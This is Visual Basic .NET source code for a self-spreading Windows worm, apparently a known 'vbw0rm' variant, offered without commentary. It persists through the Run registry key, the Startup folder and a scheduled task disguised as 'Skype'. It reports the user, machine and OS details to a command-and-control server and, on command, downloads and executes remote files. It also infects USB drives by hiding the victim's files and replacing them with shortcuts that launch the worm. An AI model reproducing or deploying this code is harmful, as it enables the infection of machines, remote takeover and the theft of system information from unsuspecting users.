Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment
Imports System.Net

Public Class worm

    Shared Sub main()
        On Error Resume Next
        Dim Instance As Boolean
        vMT = New System.Threading.Mutex(True, Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName, Instance)
        If (Instance = False) Then
            End
        End If
        Ini()
        Spread.USB()
        If Mid(Application.ExecutablePath, 2) = ":\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName Then
            If Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER", "vbw0rm", Nothing) = "" Then
                Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER", "vbw0rm", "TRUE")
            End If
        Else
            If Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER", "vbw0rm", Nothing) = "" Then
                Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER", "vbw0rm", "FALSE")
            End If
        End If
        While True
            Dim S() As String
            S = Split(v("", ""), vSPL)
            Select Case S(0)
                Case "Exc"
                    Dim W1 As WebClient = New WebClient
                    W1.DownloadFile(S(1), Environ("temp") & "\" & S(2))
                    Process.Start(Environ("temp") & "\" & S(2))
                Case "Sc"
                    IO.File.AppendAllText(Environ("temp") & "\" & S(2), S(1))
                    Process.Start(Environ("temp") & "\" & S(2))
                Case "Close"
                    End
                Case "uns"
                    Uni()
            End Select
            Thread.Sleep(6000)
        End While
    End Sub
    Private Shared Function v(cmd As String, da As String)
        Dim request As Net.HttpWebRequest = Net.HttpWebRequest.Create("http://127.0.0.1:7788/" & cmd)
        request.Method = "POST"
        request.UserAgent = inf().ToString
        Dim dataStream As Stream = request.GetRequestStream()
        dataStream.Write(Encoding.UTF8.GetBytes(da), 0, Encoding.UTF8.GetBytes(da).Length)
        dataStream.Close()
        Dim response As Net.HttpWebResponse = request.GetResponse()
        dataStream = response.GetResponseStream()
        Dim reader As New StreamReader(dataStream)
        da = reader.ReadToEnd()
        reader.Close()
        dataStream.Close()
        response.Close()
        Return da
    End Function
    Private Shared Sub Ini()
        Try
            If File.Exists((Environ(vDR) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName)) Then
            Else
                IO.File.WriteAllBytes((Environ(vDR) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName), IO.File.ReadAllBytes(Application.ExecutablePath))
                Process.Start((Environ(vDR) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName))
                End
            End If
        Catch ex As Exception
            End
        End Try
        Try
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True) _
         .SetValue(Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName, Diagnostics.Process.GetCurrentProcess.MainModule.FileName)
        Catch ex As Exception
        End Try
        Try
            IO.File.WriteAllBytes((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName), IO.File.ReadAllBytes(Application.ExecutablePath))
        Catch ex As Exception
        End Try
        Try
            Shell("schtasks /create /sc minute /mo 1 /tn Skype /tr " & ChrW(34) & Application.ExecutablePath, AppWinStyle.Hide)
        Catch ex As Exception
        End Try
        Thread.Sleep(&H3E8)
    End Sub
    Private Shared Sub Uni()
        Try
            Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName, False)
        Catch ex As Exception
        End Try
        Try
            File.Delete((Environment.GetFolderPath(SpecialFolder.Startup) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName))
        Catch ex As Exception
        End Try
        Try
            Shell("cmd.exe /k ping 0 & del " & ChrW(34) & Diagnostics.Process.GetCurrentProcess.MainModule.FileName & ChrW(34) & " & exit", AppWinStyle.Hide)
        Catch ex As Exception
        End Try
        End
    End Sub
#Region "APi"
    <DllImport("kernel32", EntryPoint:="GetVolumeInformationA", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
    Private Shared Function GetVolumeInformation(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpRootPathName As String, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    End Function

#End Region
#Region "Info"

    Private Shared Function HWD() As String
        Dim num As Integer
        Try
            GetVolumeInformation((Environ("SystemDrive") & "\"), Nothing, 0, num, 0, 0, Nothing, 0)
        Catch ex As Exception
            Return "ERR"
        End Try
        Return Conversion.Hex(num)
    End Function
    Private Shared Function inf() As String
        Dim vinf As String = ""
        Dim A
            vinf = (vinf & Convert.ToBase64String(Encoding.UTF8.GetBytes(HWD)) & vSL & " ")
        Try
            vinf = (vinf & Environment.MachineName & vSL & Environment.UserName & vSL)
        Catch ex As Exception
            vinf = (vinf & "??" & vSL)
        End Try
        Try
            vinf = (vinf & vCmp.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win"))
        Catch ex As Exception
            vinf = (vinf & "??")
        End Try
        vinf = (vinf & "SP")
        Try
            A = Split(Environment.OSVersion.ServicePack, " ")
            If (A = 1) Then
                vinf = (vinf & "0")
            End If
            vinf = (vinf & A((A.Length - 1)))
        Catch ex As Exception
            vinf = (vinf & "0")
        End Try
        Try
            vinf = (vinf & System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").Replace("AMD64", " x64").Replace("x86", " x86") & vSL)
        Catch ex As Exception
            vinf = (vinf & vSL)
        End Try
        Try
            vinf = (vinf & vSL)
        Catch ex As Exception
        End Try
        Try
            A = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER", "vbw0rm", Nothing)
            vinf = (vinf & A & vSL)
        Catch ex As Exception

        End Try
        Return (vinf)
    End Function
#End Region
#Region "Set"
    Private Shared vDR As String = "[DIR]"
    Private Shared vCmp As Computer = New Computer
    Private Shared vMT As Mutex = Nothing
    Private Shared vSPL As String = "|V|"
    Private Shared vSL As String = ChrW(92)
#End Region
End Class
Module Spread

    Private ObjectShell, ObjectLink As Object
    Dim spath As String
    Sub USB()
        spath = Command().Replace("\\\", "\").Replace("\\", "\")
        ExecParam(spath)
        Dim NewThread As Object = New Thread(AddressOf USBSpread, 1)
        NewThread.Start()
    End Sub
    Sub USBSpread()
re:
        Try
            Dim USBDrivers() As String
            USBDrivers = Split(DetectUSBDrivers, "<->")
            For i As Integer = 0 To UBound(USBDrivers) - 1
                If IO.File.Exists(USBDrivers(i) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName) = False Then
                    IO.File.Copy(Application.ExecutablePath, USBDrivers(i) & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName)
                    IO.File.SetAttributes(USBDrivers(i) & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName, FileAttributes.Hidden + FileAttributes.System)
                End If
                For Each GettingFile As String In IO.Directory.GetFiles(USBDrivers(i))
                   If Not IO.Path.GetExtension(GettingFile) = ".lnk" Then
                        If Not System.IO.Path.GetFileName(GettingFile) = Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName Then
                            Threading.Thread.Sleep(100)
                            IO.File.SetAttributes(GettingFile, FileAttributes.Hidden + FileAttributes.System)
                            CreateShortCut(System.IO.Path.GetFileName(GettingFile), USBDrivers(i), System.IO.Path.GetFileNameWithoutExtension(GettingFile), GetIconoffile(System.IO.Path.GetExtension(GettingFile)))
                        End If
                    End If
                Next
                For Each Dir As String In Directory.GetDirectories(USBDrivers(i))
                   Threading.Thread.Sleep(100)
                    IO.File.SetAttributes(Dir, FileAttributes.Hidden + FileAttributes.System)
                    CreateShortCut(IO.Path.GetFileNameWithoutExtension(Dir), USBDrivers(i) & "\", IO.Path.GetFileNameWithoutExtension(Dir), Nothing)
                Next
            Next i
        Catch : End Try
        Thread.Sleep(5000)
        GoTo re
    End Sub
    Private Function CreateShortCut(ByVal TargetName As String, ByVal ShortCutPath As String, ByVal ShortCutName As String, ByVal Icon As String) As Boolean
        On Error Resume Next
        ObjectShell = CreateObject("WScript.Shell")
        ObjectLink = ObjectShell.CreateShortcut(ShortCutPath & "\" & ShortCutName & ".lnk")
        ObjectLink.TargetPath = ShortCutPath & "\" & Diagnostics.Process.GetCurrentProcess.MainModule.ModuleName
        ObjectLink.WindowStyle = 1
        If Icon = Nothing Then
            ObjectLink.Arguments = " " & ShortCutPath & "\" & TargetName
            ObjectLink.IconLocation = "%SystemRoot%\system32\SHELL32.dll,3"
        Else
            ObjectLink.Arguments = " " & ShortCutPath & "\" & TargetName
            ObjectLink.IconLocation = Icon
        End If
        ObjectLink.Save()
    End Function
    Private Function GetIconoffile(ByVal FileFormat As String) As String
        Try
            Dim Registry = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim GetValue As String = Registry.OpenSubKey(Registry.OpenSubKey(FileFormat, False).GetValue("") & "\DefaultIcon\").GetValue("", "")
            If GetValue.Contains(",") = False Then GetValue &= ",0"
            Return GetValue
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Private Function DetectUSBDrivers() As String
        Dim USBDrivers As String
        USBDrivers = ""
        Dim usbdrive As DriveInfo
        For Each usbdrive In DriveInfo.GetDrives
            If usbdrive.DriveType = IO.DriveType.Removable Then
                USBDrivers = USBDrivers & usbdrive.RootDirectory.FullName & "<->"
            End If
        Next
        Return USBDrivers
    End Function
    Private Sub ExecParam(ByVal Parameter As String)
        If Parameter <> vbNullString Then
            If InStrRev(Parameter, ".") Then
                Process.Start(Parameter)
            Else
                Shell("explorer " & Parameter, AppWinStyle.NormalFocus)
            End If
        End If
    End Sub
End Module